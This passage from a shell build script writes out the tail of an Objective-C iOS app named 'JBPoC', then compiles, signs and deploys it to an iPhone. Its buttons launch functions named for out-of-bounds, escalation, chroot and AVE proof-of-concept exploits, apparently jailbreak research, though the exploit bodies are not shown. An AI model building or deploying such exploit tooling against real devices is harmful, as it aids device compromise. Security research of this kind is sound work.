- (void)runPropDump {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPropertyDump();
    });
}

- (void)runTier1 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier1OOB();
    });
}

- (void)runVerify {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runVerifyAndTrigger();
    });
}

- (void)runTier1b {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier1bOOB();
    });
}

- (void)runEscalate {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runEscalation();
    });
}

- (void)runNarrow {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runNarrowPanic();
    });
}

- (void)runTier2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier2Probe();
    });
}

- (void)runBoth {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runChrootPoC();
        runAVE2PoC();
        pocLog(@"");
        pocLog(@"════════════════════════════════════");
        pocLog(@"  ALL PoCs COMPLETE");
        pocLog(@"  Copy logs: long-press → Select All → Copy");
        pocLog(@"  Or check Console.app on Mac");
        pocLog(@"════════════════════════════════════");
    });
}

- (void)runIdleWait {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPhase2_IdleWait();
    });
}

- (void)runTruncation {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPhase2_Truncation();
    });
}

- (void)runBoundary {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPhase2_Boundary();
    });
}

- (void)runTeardown {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPhase2_Teardown();
    });
}

- (void)runRunBv2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runRunB_v2();
    });
}

- (void)runRunC1 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runRunC1();
    });
}

- (void)runDPrep {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runDPrep();
    });
}

- (void)runDPrep2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runDPrep2();
    });
}

- (void)runRunC2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runRunC2();
    });
}

- (void)runExp3 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runExp3_ModeA();
    });
}

@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [PoCViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
OBJC

echo "  main.m written ($(wc -l < "$WORK/main.m") lines)"

# ---- Compile ----
echo ""
echo "[3/6] Compiling for arm64 (iPhone)..."

"$CLANG" \
    -arch arm64 \
    -isysroot "$SDK" \
    -miphoneos-version-min=26.0 \
    -framework UIKit \
    -framework Foundation \
    -framework VideoToolbox \
    -framework CoreMedia \
    -framework CoreVideo \
    -framework AVFoundation \
    -framework IOSurface \
    -framework IOKit \
    -fobjc-arc \
    -Wno-deprecated-declarations \
    -O2 \
    -o "$WORK/JBPoC.app/JBPoC" \
    "$WORK/main.m"

echo "  Binary: $(du -h "$WORK/JBPoC.app/JBPoC" | cut -f1)"

# ---- Create .app bundle ----
echo ""
echo "[4/6] Creating .app bundle..."

cp "$WORK/Info.plist" "$WORK/JBPoC.app/Info.plist"

# Minimal PkgInfo
printf "APPL????" > "$WORK/JBPoC.app/PkgInfo"

echo "  Bundle: $WORK/JBPoC.app"
ls -la "$WORK/JBPoC.app/"

# ---- Sign ----
echo ""
echo "[5/6] Code signing..."

codesign -f -s "$IDENTITY" \
    --entitlements "$WORK/entitlements.plist" \
    "$WORK/JBPoC.app"

if [ $? -eq 0 ]; then
    echo "  Signed successfully with: $IDENTITY"
    codesign -dvv "$WORK/JBPoC.app" 2>&1 | head -5
else
    echo "  WARNING: Signing failed. See manual deployment below."
fi

# ---- Deploy ----
echo ""
echo "[6/6] Deploying to iPhone..."

if [ "$HAS_IOS_DEPLOY" = true ]; then
    echo "  Running ios-deploy..."
    ios-deploy --bundle "$WORK/JBPoC.app" --debug 2>&1 || {
        echo ""
        echo "  ios-deploy failed. Try manual deployment instead."
    }
else
    echo "  ios-deploy not installed."
fi

echo ""
echo "========================================"
echo "  DEPLOYMENT COMPLETE"
echo "========================================"
echo ""
echo "The app 'JBPoC' should now be on your iPhone."
echo "Open it and tap 'Run Both' to execute all PoCs."
echo ""
echo "Monitor output:"
echo "  - On-screen: green text in the app"
echo "  - Console.app on Mac: filter by 'JBPoC' or 'CVE'"
echo "  - Crash logs: Settings → Privacy → Analytics"
echo ""
echo "========================================"
echo "  MANUAL XCODE DEPLOYMENT (if above failed)"
echo "========================================"
echo ""
echo "1. Open Xcode → File → New → Project → iOS App"
echo "   Product name: JBPoC"
echo "   Language: Objective-C"
echo "   Bundle ID: com.research.jbpoc"
echo ""
echo "2. Delete all auto-generated .m/.h files"
echo ""
echo "3. Add this file to the project:"
echo "   $WORK/main.m"
echo ""
echo "4. In Build Settings:"
echo "   - Set 'iOS Deployment Target' to 26.0"
echo "   - Add frameworks: VideoToolbox, CoreMedia, AVFoundation, IOKit"
echo ""
echo "5. Select your iPhone as build target"
echo ""
echo "6. Cmd+R to build and run"
echo ""
echo "App source: $WORK/main.m"
